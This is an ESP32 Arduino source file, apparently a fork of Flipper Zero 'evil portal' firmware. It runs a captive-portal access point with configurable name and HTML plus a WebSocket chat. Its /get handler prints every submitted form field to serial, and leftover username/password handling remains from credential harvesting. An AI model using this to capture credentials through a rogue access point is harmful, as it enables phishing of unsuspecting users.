#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>
#include <deque>
#include <stdlib.h>
#include <set>

#define MAX_HTML_SIZE 20000
#define B_PIN 4
#define G_PIN 5
#define R_PIN 6
#define WAITING 0
#define GOOD 1
#define BAD 2
#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

String user_name;
String password;

bool runServer = false;
bool name_received = false;
bool password_received = false;

char apName[30] = "";
char index_html[MAX_HTML_SIZE] = "TEST";

// message history
std::deque<String> messageLog;
//set message history to 50 by default, you can change it here: (how many messages the server backs up)
const size_t maxMessages = 50;

// RESET
void (*resetFunction)(void) = 0;

// Track connected clients by IP to limit "client connected" messages
std::set<uint32_t> connectedClients;

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};

void setLed(int i) {
  digitalWrite(B_PIN, i == WAITING ? LOW : HIGH);
  digitalWrite(G_PIN, i == GOOD ? LOW : HIGH);
  digitalWrite(R_PIN, i == BAD ? LOW : HIGH);
}

void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client,
               AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    for (String msg : messageLog) {
      client->text(msg);
    }
  }

  if (type == WS_EVT_DATA) {
    String msg = String((char*)data);
    int u1 = msg.indexOf("\"username\":\"") + 12;
    int u2 = msg.indexOf("\"", u1);
    int m1 = msg.indexOf("\"message\":\"") + 11;
    int m2 = msg.indexOf("\"", m1);
    String username = msg.substring(u1, u2);
    String message = msg.substring(m1, m2);

    Serial.println(username + ":" + message);  // Keep this plain

    String fullMsg = "{\"username\":\"" + username + "\",\"message\":\"" + message + "\"}";  // For storage
    messageLog.push_back(fullMsg);
    if (messageLog.size() > maxMessages) messageLog.pop_front();

    for (AsyncWebSocketClient &c : ws.getClients()) {
      c.text(fullMsg);
    }
  }
}

void setupServer() {
  ws.onEvent(onWsEvent);
  server.addHandler(&ws);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    uint32_t ip = request->client()->remoteIP();
    if (connectedClients.find(ip) == connectedClients.end()) {
      connectedClients.insert(ip);
      Serial.println(String(ip) + " connected");

    }
    request->send_P(200, "text/html", index_html);
  });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (request->params()) {
      for (uint8_t i = 0; i < request->params(); i++) {
        const AsyncWebParameter* p = request->getParam(i);
        Serial.println(p->name() + ": " + p->value());
      }
    }
    request->send(200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });

  // Redirect all unknown requests to AP IP
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("http://" + WiFi.softAPIP().toString());
  });
}

void startAP() {
  WiFi.mode(WIFI_AP);
  if (password.length() > 0) {
    WiFi.softAP(apName, password.c_str(), 1, 0, 255);
  } else {
    WiFi.softAP(apName, nullptr, 1, 0, 255);
  }
  Serial.print("AP ip: ");
  Serial.println(WiFi.softAPIP());
  Serial.print("AP name: ");
  Serial.println(apName);
  Serial.print("AP password: ");
  Serial.println(password.length() > 0 ? password : "(none)");

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(char *command) {
  if (Serial.available() > 0) {
    String msg = Serial.readString();
    return strncmp(msg.c_str(), command, strlen(command)) == 0;
  }
  return false;
}

void getInitInput() {
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap) {
    if (Serial.available() > 0) {
      String msg = Serial.readString();
      const char *ptr = msg.c_str();
      if (strncmp(ptr, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0) {
        ptr += strlen(SET_HTML_CMD);
        strncpy(index_html, ptr, strlen(ptr) - 1);
        has_html = true;
        Serial.println("Captive portal set");
      } else if (strncmp(ptr, SET_AP_CMD, strlen(SET_AP_CMD)) == 0) {
        ptr += strlen(SET_AP_CMD);
        String apData = String(ptr);
        apData.trim();
        //seperates the AP name from the AP password (from the Set AP name option on flipper)
        //e.g. Set AP name to "AP_NAME_HERE;AP_PASSWORD_HERE" <-- the `;` symbol seperates the name/password
        int sep = apData.indexOf(';');
        if (sep != -1) {
          String name = apData.substring(0, sep);
          String pass = apData.substring(sep + 1);
          name.toCharArray(apName, sizeof(apName));
          password = pass;
        } else {
          apData.toCharArray(apName, sizeof(apName));
          password = ""; // open network
        }
        has_ap = true;
      } else if (strncmp(ptr, RESET_CMD, strlen(RESET_CMD)) == 0) {
        resetFunction();
      }
    }
  }
}

void startPortal() {
  startAP();
  runServer = true;
}

void setup() {
  pinMode(B_PIN, OUTPUT);
  pinMode(G_PIN, OUTPUT);
  pinMode(R_PIN, OUTPUT);

  setLed(WAITING);
  Serial.begin(115200);
  getInitInput();
  setLed(GOOD);
  startPortal();
}

void loop() {
  dnsServer.processNextRequest();
  if (name_received && password_received) {
    name_received = false;
    password_received = false;
    String jsonOut = "{\"username\":\"" + user_name + "\",\"message\":\"" + password + "\"}";
    Serial.println(jsonOut);
  }
  if (checkForCommand(RESET_CMD)) {
    Serial.println("reseting");
    resetFunction();
  }
  dnsServer.processNextRequest();
}